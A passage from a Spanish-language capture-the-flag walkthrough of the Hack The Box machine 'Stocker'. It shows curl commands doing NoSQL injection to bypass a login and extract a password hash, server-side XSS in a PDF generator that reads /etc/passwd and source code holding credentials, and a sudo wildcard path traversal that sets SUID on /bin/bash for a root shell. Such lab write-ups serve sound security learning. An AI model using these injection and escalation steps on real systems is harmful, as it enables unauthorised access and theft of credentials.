</code></pre></div><p>Y pruebar diferentes caracteres donde est√° la <code>x</code>. Cuando somos redirigidos a <code>/stock</code>, sabremos que el car√°cter es correcto y avanzamos al siguiente. Aqu√≠ hay un ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">'{"username":{"$regex":"^a.*"},"password":{"$ne":"bar"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
Found. Redirecting to /stock

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">'{"username":{"$regex":"^b.*"},"password":{"$ne":"bar"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">'{"username":{"$regex":"^c.*"},"password":{"$ne":"bar"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
Found. Redirecting to /login?error=login-error
</code></pre></div><p>Arriba podemos ver que el campo <code>username</code> comienza con <code>a</code>. En este punto, podemos escribir un <em>script</em> en Python para probar todos los caracteres posibles de los campos <code>username</code> y <code>password</code>. El <em>script</em> se llama <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Stocker/nosqli_regex.py"><code>nosqli_regex.py</code></a> (explicaci√≥n detallada <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Stocker#nosqli_regexpy">aqu√≠</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">nosqli_regex.py</span>
[<span class="code-green">+</span>] Username: angoose
[<span class="code-green">+</span>] Password: b3e795719e2a644f69838a593dd159ac  
</code></pre></div><p>Entonces, <code>angoose</code> es un usuario v√°lido, y tenemos el <em>hash</em> de su contrase√±a. Desafortunadamente, no es una contrase√±a d√©bil y no se puede romper el <em>hash</em>:</p><p><img alt="Stocker 6" src="/images/HTB/Stocker/Stocker-6.webp"></p><p>Por lo tanto, debemos continuar enumerando la nueva p√°gina web.</p><h3 id="funcionalidad-de-exportar-a-pdf">Funcionalidad de exportar a PDF</h3><p>Si seleccionamos algunos art√≠culos, se agregar√°n al carrito:</p><p><img alt="Stocker 7" src="/images/HTB/Stocker/Stocker-7.webp"></p><p><img alt="Stocker 8" src="/images/HTB/Stocker/Stocker-8.webp"></p><p>Luego, podemos finalizar la compra y la p√°gina mostrar√° un enlace para generar un recibo en formato PDF:</p><p><img alt="Stocker 9" src="/images/HTB/Stocker/Stocker-9.webp"></p><p><img alt="Stocker 10" src="/images/HTB/Stocker/Stocker-10.webp"></p><p>Si ejecutamos <code>exiftool</code> en este documento, veremos que se genera usando Chromium (Skia/PDF m108):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a | <span class="code-dark-green">exiftool</span> -  
ExifTool Version Number         : 12.50
File Size                       : 0 bytes
File Modification Date/Time     : 2023:01:14 00:00:00+01:00
File Access Date/Time           : 2023:01:14 00:00:00+01:00
File Inode Change Date/Time     : 2023:01:14 00:00:00+01:00
File Permissions                : prw-rw----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:13 23:00:00+00:00
Modify Date                     : 2023:01:13 23:00:00+00:00
</code></pre></div><p>Esto significa que el servidor us√≥ un navegador Chromium y export√≥ una p√°gina web HTML a formato PDF, por lo que tal vez podamos inyectar etiquetas HTML&mldr;</p><h2 id="acceso-a-la-m√°quina">Acceso a la m√°quina</h2><p>Usando Burp Suite, capturamos la petici√≥n HTTP para modificar algunos datos:</p><p><img alt="Stocker 11" src="/images/HTB/Stocker/Stocker-11.webp"></p><p>Por ejemplo, ponemos <code>&lt;u>Cup&lt;/u></code> en el nombre del art√≠culo:</p><p><img alt="Stocker 12" src="/images/HTB/Stocker/Stocker-12.webp"></p><p>El documento PDF generado muestra <code>Cup</code> subrayado, por lo que se han interpretado las etiquetas HTML:</p><p><img alt="Stocker 13" src="/images/HTB/Stocker/Stocker-13.webp"></p><p>En este punto, podemos realizar un ataque de <em>Cross-Site Scripting</em> (XSS), m√°s espec√≠ficamente, un ataque XSS del lado servidor (m√°s informaci√≥n en <a target="_blank" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">HackTricks</a>).</p><p>Intentemos con una etiqueta simple <code>img</code> para ver si JavaScript se ejecuta:</p><p><img alt="Stocker 14" src="/images/HTB/Stocker/Stocker-14.webp"></p><p>Y s√≠, se ejecuta:</p><p><img alt="Stocker 15" src="/images/HTB/Stocker/Stocker-15.webp"></p><p>Hay m√°s <em>payloads</em> que funcionan, por ejemplo, una etiqueta <code>object</code>:</p><p><img alt="Stocker 16" src="/images/HTB/Stocker/Stocker-16.webp"></p><p><img alt="Stocker 17" src="/images/HTB/Stocker/Stocker-17.webp"></p><p>Como se puede ver, logramos un leer archivo local ya que podemos imprimir el contenido de <code>/etc/passwd</code> dentro del documento PDF.</p><p>Podemos usar el <em>payload</em> de <code>img</code> para escribir un <code>iframe</code> usando JavaScript y, por lo tanto, sobrescribir todo el DOM para que solo veamos el archivo deseado:</p><p><img alt="Stocker 18" src="/images/HTB/Stocker/Stocker-18.webp"></p><p><img alt="Stocker 19" src="/images/HTB/Stocker/Stocker-19.webp"></p><p>Ahora, podemos cambiar a la pesta√±a Repeater y realizar m√°s peticiones si es necesario. Podemos aumentar el tama√±o de la ventana <code>iframe</code> con las propiedades <code>height</code> y <code>width</code>:</p><p><img alt="Stocker 20" src="/images/HTB/Stocker/Stocker-20.webp"></p><p><img alt="Stocker 21" src="/images/HTB/Stocker/Stocker-21.webp"></p><p>Algunos archivos relevantes para leer ahora son archivos JavaScript del servidor (ya sabemos que usa Node.js). Para conocer la ruta completa, podemos causar un error en la lectura del formato JSON:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">'{'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;SyntaxError: Unexpected end of JSON input&lt;br&gt;    at JSON.parse (&lt;anonymous&gt;)&lt;br&gt;    at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)&lt;br&gt;    at /var/www/dev/node_modules/body-parser/lib/read.js:128:18&lt;br&gt;    at AsyncResource.runInAsyncScope (node:async_hooks:203:9)&lt;br&gt;    at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)&lt;br&gt;    at done (/var/www/dev/node_modules/raw-body/index.js:220:7)&lt;br&gt;    at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)&lt;br&gt;    at IncomingMessage.emit (node:events:513:28)&lt;br&gt;    at endReadableNT (node:internal/streams/readable:1359:12)&lt;br&gt;    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)&lt;/pre&gt;  
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>Ahora sabemos que <code>/var/www/dev/</code> es el directorio ra√≠z del servidor web, Entonces podemos adivinar que el archivo principal es uno de: <code>main.js</code>, <code>app.js</code>, <code>script.js</code>, <code>server.js</code>, <code>index.js</code>&mldr; Esta vez, <code>/var/www/dev/index.js</code> es el correcto:</p><p><img alt="Stocker 22" src="/images/HTB/Stocker/Stocker-22.webp"></p><p>En el c√≥digo fuente, podemos encontrar credenciales para MongoDB: <code>dev: IHeardPassphrasesArePrettySecure</code>. Y la contrase√±a es reutilizada por <code>angoose</code> en SSH, por lo que tenemos acceso a la m√°quina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> angoose@10.10.11.196
angoose@10.10.11.196's password:  
<span class="code-green">angoose@stocker</span>:<span class="code-blue">~</span>$ cat user.txt
1fca8c004c27820b10ed7c3976cfa245
</code></pre></div><h2 id="enumeraci√≥n-del-sistema">Enumeraci√≥n del sistema</h2><p>Este usuario puede ejecutar cualquier <em>script</em> de Node.js que coincida con esta ruta: <code>/usr/local/scripts/*.js</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">angoose@stocker</span>:<span class="code-blue">~</span>$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
</code></pre></div><p>Sin embargo, los <em>scripts</em> que est√°n dentro no son legibles:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">angoose@stocker</span>:<span class="code-blue">~</span>$ ls -l /usr/local/scripts
total 24
-rwxr-x--x 1 root root  245 Dec  6 09:53 <span class="code-green">creds.js</span>
-rwxr-x--x 1 root root 1625 Dec  6 09:53 <span class="code-green">findAllOrders.js</span>
-rwxr-x--x 1 root root  793 Dec  6 09:53 <span class="code-green">findUnshippedOrders.js</span>  
drwxr-xr-x 2 root root 4096 Dec  6 10:33 <span class="code-blue">node_modules</span>
-rwxr-x--x 1 root root 1337 Dec  6 09:53 <span class="code-green">profitThisMonth.js</span>
-rwxr-x--x 1 root root  623 Dec  6 09:53 <span class="code-green">schema.js</span>
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>La clave aqu√≠ es el uso de un <em>wildcard</em> para especificar la ruta del <em>script</em> que se ejecutar√°. De hecho, simplemente podemos ascender directorios y ejecutar un <em>script</em> que est√© en cualquier otro directorio, algo as√≠:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">angoose@stocker</span>:<span class="code-blue">~</span>$ de /tmp
<span class="code-green">angoose@stocker</span>:<span class="code-blue">/tmp</span>$ cat &gt; .privesc.js
console.log('asdf')
const { execSync } = require('child_process')
execSync('chmod 4755 /bin/bash')
^C
<span class="code-green">angoose@stocker</span>:<span class="code-blue">/tmp</span>$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-green">/bin/bash</span>
<span class="code-green">angoose@stocker</span>:<span class="code-blue">/tmp</span>$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/.privesc.js  
asdf
<span class="code-green">angoose@stocker</span>:<span class="code-blue">/tmp</span>$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-white code-bg-red">/bin/bash</span>
</code></pre></div><p>Con el <em>script</em> anterior, hemos ejecutado <code>chmod 4755 /bin/bash</code> como <code>root</code> usando <code>sudo</code> (abusando del <em>wildcard</em>), por lo que ahora podemos conseguir una <em>shell</em> como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">angoose@stocker</span>:<span class="code-blue">/tmp</span>$ bash -p
bash-5.0# cat /root/root.txt
0bad2234ec6622cb146e3bf873af4e81  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#encontrando-una-inyecci√≥n-nosql">Encontrando una inyecci√≥n NoSQL</a></li><li><a href="#extrayendo-valores-mediante-nosqli">Extrayendo valores mediante NoSQLi</a></li><li><a href="#funcionalidad-de-exportar-a-pdf">Funcionalidad de exportar a PDF</a></li></ul></li><li><a href="#acceso-a-la-m√°quina">Acceso a la m√°quina</a></li><li><a href="#enumeraci√≥n-del-sistema">Enumeraci√≥n del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de res√∫menes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>